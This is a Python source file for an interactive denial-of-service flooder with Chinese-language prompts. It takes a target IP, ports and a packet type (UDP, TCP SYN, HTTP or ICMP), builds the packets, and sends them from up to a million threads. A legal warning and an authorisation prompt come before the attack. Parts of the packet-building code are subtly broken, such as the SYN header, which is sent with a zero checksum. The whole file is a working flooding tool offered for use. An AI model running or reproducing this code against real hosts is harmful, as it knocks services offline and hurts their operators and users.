import os
import sys
import time
import socket
import random
import threading
from datetime import datetime
import re
import struct
from colorama import init, Fore

version = "1.0.1"

title = '''
M""""""'YMM MMP"""""YMM MP""""""`MM MMP"""""""MM M""""""""M M""""""""M MMP"""""""MM MM'""""'YMM M""MMMMM""M
M  mmmm. `M M' .mmm. `M M  mmmmm..M M' .mmmm  MM Mmmm  mmmM Mmmm  mmmM M' .mmmm  MM M' .mmm. `M M  MMMM' .M
M  MMMMM  M M  MMMMM  M M.      `YM M         `M MMMM  MMMM MMMM  MMMM M         `M M  MMMMMooM M       .MM
M  MMMMM  M M  MMMMM  M MMMMMMM.  M M  MMMMM  MM MMMM  MMMM MMMM  MMMM M  MMMMM  MM M  MMMMMMMM M  MMMb. YM
M  MMMM' .M M. `MMM' .M M. .MMM'  M M  MMMMM  MM MMMM  MMMM MMMM  MMMM M  MMMMM  MM M. `MMM' .M M  MMMMb  M
M       .MM MMb     dMM Mb.     .dM M  MMMMM  MM MMMM  MMMM MMMM  MMMM M  MMMMM  MM MM.     .dM M  MMMMM  M
MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMM MMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM
'''

version = f'''
当前版本: {version}
输入 'help' 查看帮助
{"=" * 107}'''

init()

def start():
    def is_valid_ip(ip):
        ipv4_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
        if ipv4_pattern.match(ip):
            parts = ip.split('.')
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        ipv6_pattern = re.compile(
            r'^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|'
            r'^::([0-9a-fA-F]{1,4}:){0,6}[0-9a-fA-F]{1,4}$|'
            r'^([0-9a-fA-F]{1,4}:){1,6}::([0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}$'
        )
        return bool(ipv6_pattern.match(ip))

    class Attack:
        def __init__(self):
            now = datetime.now()
            self.hour = now.hour
            self.minute = now.minute
            self.day = now.day
            self.month = now.month
            self.year = now.year
            try:
                while True:
                    self.ip = input("请输入目标IP: ").strip()
                    if is_valid_ip(self.ip):
                        break
                    print("错误: 无效的IP地址格式，请输入有效的IPv4或IPv6地址")
                
                ports_input = input("输入攻击端口(多个端口用逗号分隔): ").strip()
                if not ports_input:
                    raise ValueError("至少需要指定一个端口")
                self.ports = []
                for p in ports_input.split(','):
                    port = p.strip()
                    if not port.isdigit() or not (0 < int(port) <= 65535):
                        raise ValueError(f"无效端口号: {port}")
                    self.ports.append(int(port))
                
                print("可选的包类型: udp, syn, http, icmp")
                packets_input = input("选择包类型(多个用逗号分隔，默认udp): ").strip().lower()
                if not packets_input:
                    self.packet_types = ['udp']
                else:
                    self.packet_types = [p.strip() for p in packets_input.split(',')]
                    valid_types = {'udp', 'syn', 'http', 'icmp'}
                    for p in self.packet_types:
                        if p not in valid_types:
                            raise ValueError(f"无效包类型: {p} (仅支持 udp/syn/http/icmp)")
                
                self.speed = int(input("攻击速度(1~1 000): "))
                if not (1 <= self.speed <= 1000):
                    raise ValueError("攻击速度必须在1~1 000之间")
                
                self.threads = int(input("线程数量(建议1 ~ 100 0000): "))
                if not (1 <= self.threads <= 1000000):
                    raise ValueError("线程数量必须在1 ~ 1 000 000之间")
                
                self.counter = 0
                self.lock = threading.Lock()
                self.running = True
                self.sockets = []
                self.family = socket.AF_INET6 if ':' in self.ip else socket.AF_INET
            except ValueError as e:
                print(f"\n输入错误: {e}")
                raise
            except Exception as e:
                print(f"\n初始化错误: {e}")
                raise

        def create_icmp_packet(self):
            icmp_type = 8
            icmp_code = 0
            checksum = 0
            identifier = random.randint(0, 65535)
            sequence = random.randint(0, 65535)
            payload = random._urandom(32)
            
            header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
            packet = header + payload
            
            checksum = 0
            for i in range(0, len(packet), 2):
                if i + 1 < len(packet):
                    word = (packet[i] << 8) + packet[i + 1]
                    checksum += word
            
            checksum = (checksum >> 16) + (checksum & 0xffff)
            checksum = ~checksum & 0xffff
            
            packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence) + payload
            return packet

        def create_syn_packet(self):
            src_port = random.randint(1024, 65535)
            dst_port = random.choice(self.ports)
            seq_num = random.randint(0, 4294967295)
            ack_num = 0
            data_offset = 5 << 4
            flags = 0x02
            window = socket.htons(5840)
            checksum = 0
            urg_ptr = 0
            
            if self.family == socket.AF_INET:
                src_addr = socket.inet_pton(socket.AF_INET, '0.0.0.0')
                dst_addr = socket.inet_pton(socket.AF_INET, self.ip)
                protocol = socket.IPPROTO_TCP
                tcp_length = 20
                
                pseudo_header = struct.pack('!4s4sBBH',
                                          src_addr,
                                          dst_addr,
                                          0,
                                          protocol,
                                          tcp_length)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                   src_port,
                                   dst_port,
                                   seq_num,
                                   ack_num,
                                   data_offset,
                                   flags,
                                   window,
                                   checksum,
                                   urg_ptr)
            return tcp_header

        def create_http_packet(self):
            methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
            path = '/' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(3, 10)))
            host = self.ip
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                'Mozilla/5.0 (Linux; Android 10; SM-G975F)'
            ]
            
            http_request = (
                f"{random.choice(methods)} {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(user_agents)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            return http_request.encode()

        def create_udp_packet(self):
            return random._urandom(1490)

        def attack_port(self, port):
            try:
                sock = socket.socket(self.family, socket.SOCK_DGRAM if 'udp' in self.packet_types else socket.SOCK_RAW)
                self.sockets.append(sock)
                
                while self.running:
                    try:
                        for ptype in self.packet_types:
                            if ptype == 'udp':
                                packet = self.create_udp_packet()
                                sock.sendto(packet, (self.ip, port))
                            elif ptype == 'icmp':
                                if self.family == socket.AF_INET:
                                    packet = self.create_icmp_packet()
                                    sock.sendto(packet, (self.ip, 0))
                            elif ptype == 'syn':
                                packet = self.create_syn_packet()
                                sock.sendto(packet, (self.ip, port))
                            elif ptype == 'http':
                                packet = self.create_http_packet()
                                if self.family == socket.AF_INET6:
                                    sock.sendto(packet, (self.ip, port, 0, 0))
                                else:
                                    sock.sendto(packet, (self.ip, port))
                            
                            with self.lock:
                                self.counter += 1
                                if self.counter % 100 == 0:
                                    ports_str = ','.join(map(str, self.ports))
                                    types_str = ','.join(self.packet_types)
                                    print(f"已发送 {self.counter} 个 {types_str} 数据包到 IP: {self.ip} 的端口: {ports_str}", end="\r")
                        
                        time.sleep((1000 - self.speed) / 2000)
                    except socket.error as e:
                        print(f"\n网络错误: {e}")
                        break
                    except Exception as e:
                        print(f"\n未知错误: {e}")
                        break
            except Exception as e:
                print(f"\n创建socket错误: {e}")

        def start(self):
            print(f"\n[攻击信息]")
            print('-' * 50)
            print(f"目标IP: {self.ip}")
            print(f"IP类型: {'IPv6' if ':' in self.ip else 'IPv4'}")
            print(f"攻击速度: {self.speed}")
            print(f"攻击端口: {self.ports}")
            print(f"线程数量: {self.threads}")
            print(f"包类型: {self.packet_types}")
            print('-' * 50)
            print("\n正在攻击...\n")
            
            try:
                threads_per_port = max(1, self.threads // len(self.ports))
                for port in self.ports:
                    for _ in range(threads_per_port):
                        thread = threading.Thread(target=self.attack_port, args=(port,))
                        thread.daemon = True
                        thread.start()
                
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    self.running = False
                    print("\n正在停止攻击...")
                    time.sleep(1)
            finally:
                for sock in self.sockets:
                    try:
                        sock.close()
                    except:
                        pass
                
                print(f"\n攻击已停止")
                print(f"总共发送了 {self.counter} 个数据包")

    def DOS_thread_dos_main():
        print(Fore.RED + title)
        print(Fore.GREEN + version)
        print(Fore.YELLOW + "[安全警告]")
        print(Fore.YELLOW + "-" * 40)
        print(Fore.YELLOW + "1. 请确保您有目标网站的访问授权")
        print(Fore.YELLOW + "2. 高频攻击可能导致IP被封禁")
        print(Fore.YELLOW + "3. 按 Ctrl+C 停止攻击")
        print(Fore.YELLOW + "-" * 40 + Fore.RESET)
        
        try:
            attack = Attack()
            attack.start()
        except Exception as e:
            print(f"\n程序异常: {e}")

    DOS_thread_dos_main()

def attack_dos_main():
    os.system("cls" if os.name == 'nt' else "clear")
    print(Fore.YELLOW + "[安全警告]")
    print(Fore.YELLOW + "-" * 40)
    print(Fore.YELLOW + "1. 请确保您有目标网站的访问授权")
    print(Fore.YELLOW + "2. 高频攻击可能导致IP被封禁")
    print(Fore.YELLOW + "3. 按 Ctrl+C 停止攻击")
    print(Fore.YELLOW + "-" * 40)
    print(Fore.YELLOW + "\n[重要法律声明]")
    print(Fore.YELLOW + "=" * 50)
    print(Fore.YELLOW + "根据 - 中华人民共和国刑法 - 第285、286条规定:")
    print(Fore.YELLOW + "- 未经授权对计算机系统实施攻击可处5年以下有期徒刑")
    print(Fore.YELLOW + "- 造成严重后果者可处5年以上有期徒刑")
    print(Fore.YELLOW + "=" * 50 + Fore.RESET)
    
    confirm = input("\n您确认已获得合法授权且了解法律风险吗? (y/n): ")
    if confirm.lower() in ['y', 'yes']:
        os.system("cls" if os.name == 'nt' else "clear")
        start()
    else:
        print("操作已取消")
        os.system("cls" if os.name == 'nt' else "clear")
